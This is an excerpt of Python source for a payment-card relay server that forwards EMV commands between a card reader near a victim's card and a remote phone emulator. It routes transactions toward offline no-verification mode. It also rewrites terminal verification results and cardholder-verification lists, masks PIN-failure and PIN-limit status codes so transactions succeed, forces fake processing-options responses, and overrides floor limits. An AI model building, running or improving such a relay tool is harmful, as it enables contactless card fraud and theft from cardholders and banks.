...
from card_types import lookup_bin, CARD_TYPES
...
class ProductionCardRouter:
    """
    Routing intent helper backed by card_types.py registry.
    - Identifies brand/category from 4-digit BIN prefix
    - Gates on offline support, CDCVM, CTQ, AUC, and per-type limits
    - Returns enriched decision dict with brand/card_type/offline_capable
    """

    def __init__(self) -> None:
        _extra = os.environ.get("RELAY_OFFLINE_NOCVM_BINS", "").strip()
        self._extra_prefixes: set = set()
        if _extra:
            for item in _extra.split(","):
                item = item.strip()
                if item and item.isdigit():
                    self._extra_prefixes.add(item[:4])

    @staticmethod
    def _ctq_forces_online_pin(ctq: Optional[bytes]) -> bool:
        if not ctq or len(ctq) < 1:
            return False
        return bool(ctq[0] & 0x80)

    @staticmethod
    def _ctq_cdcvm_required(ctq: Optional[bytes]) -> bool:
        if not ctq or len(ctq) < 1:
            return False
        return bool(ctq[0] & 0x20)

    @staticmethod
    def _auc_forced_pin(auc: Optional[bytes]) -> bool:
        if not auc or len(auc) < 2:
            return False
        return bool(auc[1] & 0x40)

    @staticmethod
    def _aip_cdcvm_supported(aip: Optional[bytes]) -> bool:
        if not aip or len(aip) < 2:
            return False
    ...
    def decide(
            ...
            *,
            ...
            aip: Optional[bytes] = None,
            auc: Optional[bytes] = None,
    ) -> Dict[str, Any]:
        if not pan_bin or not pan_bin.isdigit() or len(pan_bin) < 4:
            log.info(f"[ROUTER] BIN missing/invalid: {pan_bin!r} -> ONLINE")
            return {"mode": "ONLINE", "reason": "bin_missing", "max_amount": 0,
                    "brand": "UNKNOWN", "card_type": "unknown"}

        prefix = pan_bin[:4]
        card_info = lookup_bin(pan_bin)

        if card_info is None and prefix not in self._extra_prefixes:
            log.info(f"[ROUTER] BIN {pan_bin} prefix {prefix} not whitelisted -> ONLINE")
            return {"mode": "ONLINE", "reason": "bin_not_whitelisted", "max_amount": 0,
                    "brand": "UNKNOWN", "card_type": "unknown"}

        if card_info is None:
            card_info = {"name": "extra", "brand": "UNKNOWN", "category": "unknown",
                         "offline": True, "cdcvm": False, "contactless": True,
                         "offline_limit_cents": floor_limit_cents,
                         "contactless_limit_cents": floor_limit_cents,
                         "floor_limit_cents": floor_limit_cents,
                         "pin_required_above_cents": 0}

        brand = card_info.get("brand", "UNKNOWN")
        card_type_name = card_info.get("name", "unknown")
        offline_capable = card_info.get("offline", False)
        cdcvm_capable = card_info.get("cdcvm", False)

        if not offline_capable:
            log.info(f"[ROUTER] BIN {pan_bin} ({card_type_name}) no offline support -> ONLINE")
            return {"mode": "ONLINE", "reason": "no_offline_support", "max_amount": 0,
                    "brand": brand, "card_type": card_type_name,
                    "offline_capable": False, "cdcvm_capable": cdcvm_capable}

        ctq_online = self._ctq_forces_online_pin(ctq)
        ctq_cdcvm = self._ctq_cdcvm_required(ctq)
        auc_pin = self._auc_forced_pin(auc)
        aip_cdcvm = self._aip_cdcvm_supported(aip)

        if cdcvm_verified:
            log.info(f"[ROUTER] BIN {pan_bin} ({card_type_name}) CDCVM verified -> skip CTQ online-pin check")
        elif ctq_cdcvm and (cdcvm_capable or aip_cdcvm):
            log.info(f"[ROUTER] BIN {pan_bin} ({card_type_name}) CTQ CDCVM required + card supports CDCVM -> skip online-pin check")
        elif ctq_online:
            log.info(f"[ROUTER] BIN {pan_bin} ({card_type_name}) CTQ forces online PIN -> ONLINE")
            return {"mode": "ONLINE", "reason": "ctq_forces_online_pin",
                    "max_amount": 0, "brand": brand, "card_type": card_type_name,
                    "offline_capable": True, "cdcvm_capable": cdcvm_capable}
        elif auc_pin and not cdcvm_verified:
            log.info(f"[ROUTER] BIN {pan_bin} ({card_type_name}) AUC forced PIN -> ONLINE")
            return {"mode": "ONLINE", "reason": "auc_forced_pin",
                    "max_amount": 0, "brand": brand, "card_type": card_type_name,
                    "offline_capable": True, "cdcvm_capable": cdcvm_capable}

        type_limit = card_info.get("offline_limit_cents", 0)
        pin_threshold = card_info.get("pin_required_above_cents", 0)
        effective_limit = max(type_limit, floor_limit_cents) if type_limit > 0 else floor_limit_cents
        if pin_threshold > 0 and not cdcvm_verified:
            effective_limit = min(effective_limit, pin_threshold)

        if amount_cents > effective_limit:
            log.info(f"[ROUTER] BIN {pan_bin} ({card_type_name}) amount {amount_cents} > limit {effective_limit} -> ONLINE")
            return {"mode": "ONLINE", "reason": "amount_over_limit",
                    "max_amount": effective_limit, "brand": brand,
                    "card_type": card_type_name, "offline_capable": True,
                    "cdcvm_capable": cdcvm_capable}

        log.info(f"[ROUTER] BIN {pan_bin} ({card_type_name}) -> OFFLINE_NOCVM (limit={effective_limit})")
        return {"mode": "OFFLINE_NOCVM", "reason": "offline_nocvm_ok",
                "max_amount": effective_limit, "brand": brand,
                "card_type": card_type_name, "offline_capable": True,
                "cdcvm_capable": cdcvm_capable}
...
class RelayServer:
    ...
    def __init__(self, host: str = "0.0.0.0", port: int = 5566) -> None:
        ...
        try:
            self.card_event_debounce_seconds = max(
                0.0,
                min(5.0,
                    float(os.environ.get("RELAY_CARD_EVENT_DEBOUNCE", str(self.CARD_EVENT_DEBOUNCE_DEFAULT_SECONDS)))),
            )
        except Exception:
            self.card_event_debounce_seconds = self.CARD_EVENT_DEBOUNCE_DEFAULT_SECONDS

        try:
            self.card_present_timeout_seconds = max(
                0.0,
                float(os.environ.get("RELAY_CARD_PRESENT_TIMEOUT", "30")),
            )
        except Exception:
            self.card_present_timeout_seconds = 30.0
        self._card_present_warned: bool = False
        ...
        self._deregister_cooldown: Dict[str, float] = {}
        self.DEREGISTER_COOLDOWN_SECONDS = 10.0
        ...
        self._aip_value: Optional[bytes] = None
        self._auc_value: Optional[bytes] = None
    ...
    def start(self) -> None:
        ...
        try:
            ...
            cp_timeout_label = (f"{self.card_present_timeout_seconds:g}s"
                                if self.card_present_timeout_seconds > 0 else "DISABLED")
            log.info(f"Card-present timeout: {cp_timeout_label}")
    ...
    def stop(self) -> None:
        ...
        if self.sock:
            for peer in (self.reader_addr, self.emulator_addr):
                if peer:
                    self._send_ctrl_response(peer, "CARD_REMOVED")
                    self._send_ctrl_response(peer, "SERVER_SHUTDOWN")
                    self._send_ctrl_response(peer, "DEREGISTER")
                    log.info(f"Force-disconnect sent to {peer[0]}:{peer[1]}")
        ...
        self._peer_versions.clear()
        self._deregister_cooldown.clear()
        self._reset_session("server stop", unlock_epoch=True)
        self._sync_router_transport()
        if was_active:
            log.info("RelayServer stopped — all peers force-disconnected")
    ...
    def _run_maintenance(self, last_activity: float, stall_warned: bool) -> bool:
        ...
        self._check_card_present_timeout()
    ...
    # ------------------------------------------------------------------
    # 5.8b  Card-present heartbeat timeout
    # ------------------------------------------------------------------
    def _check_card_present_timeout(self) -> None:
        timeout = self.card_present_timeout_seconds
        if timeout <= 0:
            return
        if not self.state.card_present:
            self._card_present_warned = False
            return
        if self._last_card_event_ts <= 0:
            return
        elapsed = time.time() - self._last_card_event_ts
        if elapsed <= timeout:
            self._card_present_warned = False
            return
        if not self._card_present_warned:
            log.warning(
                f"CARD PRESENT stale: no heartbeat from reader for {elapsed:.1f}s "
                f"(timeout={timeout:.0f}s) — auto-clearing"
            )
            self._card_present_warned = True
        self._reset_session("card-present heartbeat timeout", unlock_epoch=True)
        with self.lock:
            ...
            self._last_card_event_ts = time.time()
        log.info(f"CARD REMOVED auto-fired (heartbeat timeout) — full epoch reset — notifying emulator")
        if self.emulator_addr:
            self._send_frame(self.emulator_addr, constants.SID_CTRL, b"CARD_REMOVED")
    ...
    def _reset_session(self, reason: str, unlock_epoch: bool = False) -> None:
        with self.lock:
            ...
            self._card_bin = None
            self._ctq_value = None
            self._aip_value = None
            self._auc_value = None
            self._floor_limit_cents = 0x7FFFFFFFFFFFFFFF
        ...
        if data.startswith(b"TP_JSON "):
            try:
                ...
                if terminal_caps:
                    ...
                    log.info(
                        f"[TP-HUB] received terminal probe recommendation: {payload.get('recommendation', {}).get('policy_mode', 'AUTO')}")
                    return False
            except Exception:
        ...
        if sid in (constants.SID_CAPDU, constants.SID_RAPDU):
            if addr not in (self.reader_addr, self.emulator_addr):
                if self.reader_addr is None and addr != self.emulator_addr:
                    ...
                    log.info(
                        f"\033[92mDEVICE CONNECTED role=READER address={addr[0]}:{addr[1]} id=auto-assigned protocol=V1\033[0m")
                elif self.emulator_addr is None and addr != self.reader_addr:
                    self.emulator_addr = addr
                    self.emulator_last_seen = time.time()
                    log.info(
                        f"\033[92mDEVICE CONNECTED role=EMULATOR address={addr[0]}:{addr[1]} id=auto-assigned protocol=V1\033[0m")
                else:
    ...
    def _handle_register(self, payload: bytes, addr: Tuple[str, int]) -> None:
        ...
        if version is not None and version != PROTOCOL_VERSION:
            self._send_ctrl_response(addr, f"ERR PROTOCOL_VERSION REQUIRED={PROTOCOL_VERSION}")
            return
        if mode in ("READER", "EMULATOR") and client_id:
            now_ts = time.time()
            stale_cd = [cid for cid, ts in self._deregister_cooldown.items()
                        if now_ts - ts > self.DEREGISTER_COOLDOWN_SECONDS]
            for cid in stale_cd:
                del self._deregister_cooldown[cid]
            if client_id in self._deregister_cooldown:
                remaining = self.DEREGISTER_COOLDOWN_SECONDS - (now_ts - self._deregister_cooldown[client_id])
                log.warning(f"REGISTER rejected for {addr}: client_id={client_id} in deregister cooldown ({remaining:.1f}s remaining)")
                self._send_ctrl_response(addr, f"ERR DEREGISTER_COOLDOWN {remaining:.1f}")
                return
        if mode == "READER":
            if self.reader_addr is not None and self.reader_addr == addr and client_id == self.reader_id:
                self.reader_last_seen = time.time()
            ...
            if self.reader_addr is not None and self.reader_addr != addr:
                ...
                if not upgrading_legacy and (client_id is None or client_id != self.reader_id):
                    now_ts = time.time()
                    stale = (constants.PEER_TIMEOUT_SECONDS > 0
                             and (now_ts - self.reader_last_seen) > constants.PEER_TIMEOUT_SECONDS)
                    same_ip = self.reader_addr[0] == addr[0]
                    if stale or same_ip:
                        action = "stale peer evicted" if stale else "same-IP rebinding"
                        log.warning(f"Reader slot force-reclaimed: {action} "
                                    f"(old={self.reader_addr} last_seen={now_ts - self.reader_last_seen:.1f}s ago)")
                        self._peer_versions.pop(self.reader_addr, None)
                        self.reader_addr = None
                        self.reader_id = None
            ...
            if self.emulator_addr is not None and self.emulator_addr == addr and client_id == self.emulator_id:
                self.emulator_last_seen = time.time()
                self._send_ack(addr, "REGISTER")
                return
            if self.emulator_addr is not None and self.emulator_addr != addr:
                ...
                if not upgrading_legacy and (client_id is None or client_id != self.emulator_id):
                    now_ts = time.time()
                    stale = (constants.PEER_TIMEOUT_SECONDS > 0
                             and (now_ts - self.emulator_last_seen) > constants.PEER_TIMEOUT_SECONDS)
                    same_ip = self.emulator_addr[0] == addr[0]
                    if stale or same_ip:
                        action = "stale peer evicted" if stale else "same-IP rebinding"
                        log.warning(f"Emulator slot force-reclaimed: {action} "
                                    f"(old={self.emulator_addr} last_seen={now_ts - self.emulator_last_seen:.1f}s ago)")
                        self._peer_versions.pop(self.emulator_addr, None)
                        self.emulator_addr = None
                        self.emulator_id = None
            ...
            if addr == self.reader_addr:
                if self.reader_id:
                    self._deregister_cooldown[self.reader_id] = time.time()
                self.reader_addr = None
                self.reader_id = None
                peer_removed = True
            ...
            if addr == self.emulator_addr:
                if self.emulator_id:
                    self._deregister_cooldown[self.emulator_id] = time.time()
                self.emulator_addr = None
                self.emulator_id = None
                peer_removed = True
        ...
        try:
            ...
            if self._gac_mutation_leader == "UNIVERSAL":
                if not (self.state.cdol1_entries and self.state.cvm_entries):
                    self._guard_log("CVM universal leader active but CDOL1/CVM context missing; skipping mutation",
                                    blocked=True)
                    return capdu
                ...
                if patch_notes and "no changes" not in patch_notes and "no viable" not in patch_notes and "cdcvm_verified" not in patch_notes:
                    with self.lock:
                ...
                mutated, note = mutate_tvr_in_generate_ac_capdu(capdu, cdcvm_verified=self.state.cdcvm_verified)
                if note is not None:
                    with self.lock:
                        self.state.tvr_mutation_count += 1
                        count = self.state.tvr_mutation_count
    ...
    def _handle_capdu(self, payload: bytes, addr: Tuple[str, int]) -> None:
        ...
        if (
            ...
            target_peer = self.emulator_addr if addr == self.reader_addr or (
                        self.reader_addr is None and addr != self.emulator_addr) else self.reader_addr
            if target_peer:
        ...
        if self._router_mutation_active():
            ...
            if not allowed:
                ...
                try:
                    if hasattr(self._packet_router, 'session') and isinstance(self._packet_router.session, dict):
                        self._packet_router.session['cdcvm_verified'] = self.state.cdcvm_verified
    ...
    def _extract_runtime_card_context(self, rapdu: bytes) -> None:
        ...
        if floor:
            try:
                ...
                pass
        _floor_override = os.environ.get("RELAY_FLOOR_LIMIT_OVERRIDE_CENTS", "").strip()
        if _floor_override:
            try:
                override_val = int(_floor_override)
                if override_val > 0:
                    self._floor_limit_cents = override_val
                    log.info(f"[FLOOR-LIMIT] Card 9F1D overridden to {override_val} cents")
            except Exception:
                pass
    ...
    def _handle_rapdu(self, payload: bytes, addr: Tuple[str, int]) -> None:
        ...
        if (source_name == "READER" or addr == self.reader_addr) and (
                payload == b"\x6f\x00" or sw == constants.SW_6F00):
        ...
        if pending and len(pending) > constants.APDU_INS and pending[constants.APDU_INS] == constants.INS_GENERATE_AC:
        ...
        pending_ins_for_guard = pending[constants.APDU_INS] if pending and len(pending) > constants.APDU_INS else None
        sw = payload[-2:] if len(payload) >= 2 else b""
        if (
                self.outcome_guard_enabled
                and pending_ins_for_guard in (constants.INS_VERIFY, constants.INS_GENERATE_AC)
                and self._pin_path_failure_sw(sw)
        ):
            old_sw = sw.hex().upper() if len(sw) == 2 else "??"
            payload = (payload[:-2] + constants.SW_9000) if len(payload) >= 2 else constants.SW_9000
        ...
        if (
            ...
            old_sw = sw.hex().upper() if len(sw) == 2 else "??"
            severity = "CRITICAL" if self._card_record_failure_count >= 3 else "WARNING"
            log.error(
                f"[CARD-STATE-{severity}] Record access failure #{self._card_record_failure_count}: SW {old_sw} on READ RECORD. "
                f"Card may be in broken state. Phase: {self.guard.phase.name}. "
                f"RECOMMENDATION: If failures persist, perform card cold-reset (power cycle) or full session restart."
            )

        # Mask card limit errors: SW 61 (contactless limit) and SW 75 (PIN tries limit)
        if sw in (bytes.fromhex("61"), bytes.fromhex("75")):
            old_sw = sw.hex().upper()
            sw_name = "Contactless limit exceeded" if old_sw == "61" else "PIN attempts limit exceeded"
            log.warning(
                f"[LIMIT-BYPASS] Masking SW {old_sw} ({sw_name}). "
                f"Card limit bypassed: transaction forced to success. Phase: {self.guard.phase.name}"
            )
            # For PIN locked (SW 75), also need to reset card state
            if old_sw == "75":
                log.error(
                    f"[PIN-UNLOCK] Card PIN counter locked (SW 75). Resetting session to unlock card. "
        ...
        if self.state.verify_bypass_enabled and sw == bytes.fromhex("63"):
            log.warning(
                f"[PIN-PROTECT] Masking SW 63 (PIN incorrect) because VERIFY_BYPASS is enabled. "
                f"Preventing PIN counter increment. Phase: {self.guard.phase.name}"
            )
            payload = constants.SW_9000
            sw = constants.SW_9000
        ...
        if (
                ...
                and sw in (bytes.fromhex("6984"), bytes.fromhex("6985"), bytes.fromhex("6F00"))
        ):
            crypto_failure_detected = True
            self._card_crypto_failure_count += 1
            self._card_last_failure_phase = self.guard.phase.name
            old_sw = sw.hex().upper() if len(sw) == 2 else "??"
            severity = "CRITICAL" if self._card_crypto_failure_count >= 3 else "WARNING"
            log.error(
                f"[CARD-STATE-{severity}] Cryptographic failure #{self._card_crypto_failure_count}: SW {old_sw} on GPO. "
                f"Card may be in broken state after relay attack. Phase: {self.guard.phase.name}. "
                f"RECOMMENDATION: If failures persist, perform card cold-reset (power cycle) or SELECT deselect/reselect AID."
            )
            if self.gpo_force_success_enabled:
                payload = bytes.fromhex("770E8202200094080801010010010200") + constants.SW_9000
                sw = constants.SW_9000
                log.warning(
            ...
            if ins == constants.INS_SELECT:
                ...
                if aid and constants.is_ppse_or_pse(aid):
                    ...
                    if ok:
                        ...
                        self._guard_log(f"PPSE advance skipped: {reason}", blocked=True)
                elif aid:
                    ...
                    if ok:
                        ...
                        self._guard_log(f"AID advance skipped: {reason}", blocked=True)
                ...
                if ok:
                    ...
                    self._guard_log(f"GPO advance skipped: {reason}", blocked=True)
                ...
                if ok:
                    ...
                    try:
                        if len(payload) < 2 or payload[-2:] != constants.SW_9000:
                            log.debug("[CVM] READ RECORD non-9000, skipping CVM extraction")
                        ...
                        if cdol1_raw:
                            with self.lock:
                                ...
                                log.info(
                                    f"[CVM] CDOL1 parsed: {len(self.state.cdol1_entries)} entries "
                        ...
                        if cvm_raw:
                            with self.lock:
                                ...
                                cvm_str = ",".join(
                                    f"{m:02X}{c:02X}" for m, c in self.state.cvm_entries
                                )
                                log.info(
                        ...
                        if auc_raw:
                            with self.lock:
                                ...
                                log.info(f"[CVM] AUC = {auc_raw.hex().upper()}")
                    except Exception as e:
                        log.error(f"[CVM] Extraction failed: {e}")
                else:
                    self._guard_log(f"READ_RECORD advance skipped: {reason}", blocked=True)
                ...
                if phase_before == Phase.READ_RECORD_DONE:
                    ...
                    if ok:
                        ...
                        self._guard_log(f"first GAC advance skipped: {reason}", blocked=True)
                    ...
                    if ok:
                        ...
                        self._guard_log(f"second GAC advance skipped: {reason}", blocked=True)
                ...
                if ok:
                    ...
                    self._guard_log(f"EXTERNAL AUTH advance skipped: {reason}", blocked=True)
        # 3. Observe the reader RAPDU for GPO/READ RECORD if the phase advanced.
        if pending and len(pending) > constants.APDU_INS:
            pending_ins = pending[constants.APDU_INS]
            if pending_ins == constants.INS_GET_PROCESSING_OPTIONS and phase_advanced:
                self._observe_reader_rapdu(payload)
            elif pending_ins == constants.INS_GENERATE_AC and phase_before == Phase.READ_RECORD_DONE and phase_advanced:
                self._observe_reader_rapdu(payload)
        # 4. Packet-router mutation
        if self._router_mutation_active():
            pending_ins = pending[constants.APDU_INS] if pending and len(pending) > constants.APDU_INS else None
            if self.state.tvr_mutation_enabled and pending_ins in (constants.INS_GET_PROCESSING_OPTIONS,
                                                                   constants.INS_READ_RECORD):
                allowed, reason = False, "GPO/READ RECORD RAPDU owned by built-in CVM mutator"
            else:
                allowed, reason = self._guard_router_mutation("rapdu", pending_ins)
            if pending_ins in (constants.INS_GET_PROCESSING_OPTIONS, constants.INS_READ_RECORD) and not phase_advanced:
                allowed = False
        ...
        if self.state.tvr_mutation_enabled:
            ...
            if pending_ins == constants.INS_GET_PROCESSING_OPTIONS:
                allowed, reason = self.guard.check_mutation(constants.INS_GET_PROCESSING_OPTIONS, self.state)
                if not phase_advanced:
                    allowed = False
                    reason = "GPO response did not complete a legal successful phase transition"
                if not allowed:
                    self._guard_log(f"GPO mutation blocked: {reason}", blocked=True)

                else:
                    try:
                        original_payload = payload
                        result = mutate_gpo_response(payload, self.state.cdcvm_verified, policy=policy)
                ...
                allowed, reason = self.guard.check_mutation(constants.INS_READ_RECORD, self.state)
                if not phase_advanced:
                    allowed = False
                    reason = "READ RECORD response did not complete a legal successful phase transition"
                if not allowed:
                    self._guard_log(f"READ RECORD mutation blocked: {reason}", blocked=True)

                elif self.state.cdcvm_verified:
                    log.info(
                        "[READ-RECORD] CDCVM evidence active: skipping CVM List replacement to preserve card original"
                    )

                else:
                    try:
                        original_payload = payload
                        result = mutate_read_record_response(payload, policy=policy, cdcvm_verified=self.state.cdcvm_verified)
                        if isinstance(result, tuple):
                            payload, _ok = result
                            if payload != original_payload:
                                log.info("[READ-RECORD-MUTATE] applied")
                        else:
                            payload = result
                    except Exception as e:
                        log.error(f"[CVM-MUTATE CRASH] {type(e).__name__}: {e}")
        ...
        self._send_frame(target, constants.SID_RAPDU, constants.build_exchange_payload(response_id, payload))
        ...
        pending_ins = (
            ...
            if self.state.pending_capdu and len(self.state.pending_capdu) > constants.APDU_INS
            else None
        )
        from constants import INS_MAP
        pending_ins_name = (
            INS_MAP.get(pending_ins, "?") if pending_ins is not None else "?"
        )
        _record_apdu(
        ...
        if self.full_output_enabled:
            ...
            log.info(
                f"RAPDU_TRACE seq={seq} len={len(payload)} sw={sw_hex} "
                f"src={source_name} dst={target_name} data={payload.hex().upper()}"
            )
        with self.lock:
            self.state.pending_capdu = None
    ...
    def _handle_ctrl(self, payload: bytes, addr: Tuple[str, int]) -> None:
        ...
        if is_card_removed_cmd:
            ...
            with self.lock:
                ...
                self._last_card_event_ts = now
            log.info(f"\033[92mCARD REMOVED detected from {addr}\033[0m")
            target = self.emulator_addr if addr == self.reader_addr or (
                        self.reader_addr is None and addr != self.emulator_addr) else self.reader_addr
            if target:
                self._send_frame(target, constants.SID_CTRL, body)
            self._send_ctrl_response(addr, "OK CARD_REMOVED")
            return
        # -----------------------------------------------------------------
        # SESSION_RESET  (full reset: clears epoch, forces re-handshake)
        # -----------------------------------------------------------------
        if command == "SESSION_RESET":
            ...
            return
        # -----------------------------------------------------------------
        # SOFT_RESET  (light reset: clears guard/state/CDCVM but preserves
        # epoch and peer bindings — no re-handshake needed)
        # -----------------------------------------------------------------
        if command == "SOFT_RESET":
            with self.lock:
                ...
                if hasattr(self, "_exchange_cv") and self._exchange_cv is not None:
                    self._exchange_cv.notify_all()
            log.info(f"SOFT_RESET applied - seq={self.state.seq} guard={self.guard.phase.name} "
                     f"epoch={self.active_epoch} preserved")
            target = self.emulator_addr if addr == self.reader_addr else self.reader_addr
            if target:
                self._send_ctrl_response(target, "SOFT_RESET")
            self._send_ctrl_response(addr, f"OK SOFT_RESET SEQ={self.state.seq} EPOCH={self.active_epoch}")
            return
        # -----------------------------------------------------------------
        # STATUS
        # -----------------------------------------------------------------
